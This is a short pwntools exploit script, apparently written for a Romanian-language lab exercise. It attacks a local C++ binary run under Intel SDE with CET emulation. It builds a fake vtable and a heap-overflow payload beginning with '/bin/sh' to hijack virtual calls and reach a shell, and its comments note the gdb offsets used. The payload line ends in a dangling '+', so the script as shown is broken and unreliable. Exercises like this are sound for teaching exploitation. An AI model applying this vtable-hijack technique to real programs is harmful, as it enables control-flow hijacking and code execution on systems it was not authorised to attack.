from pwn import *

target = process("./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex2", shell=True)
target.recvline()

'''
p &p->_projectId 
$11 = (int *) 0x4173a8 => adresa tabelei virtuale = adresa unde incepe obiectul Project = 0x4173a0 (-4 de la int - padding (4))

p (int)(0x4173a0) - (int)(&e1->_name)
$9 = 232
'''
fake_vtable_address = 0x404080     # Adresa unde vom plasa fake vtable în heap
project_destructor = 0x401736
announce_users_addr = 0x4012b9

fake_vtable = flat(
    0x0,                       # Garbage la +0
    project_destructor,        # Destructor la +8
    announce_users_addr        # announceUsers la +16
)

offset_on_project_release = 24
payload = b"/bin/sh" + 225 * b"A" + p64(fake_vtable_address) + b"B" * offset_on_project_release + p64(announce_users_addr) + 

target.sendline(payload)
# target.interactive()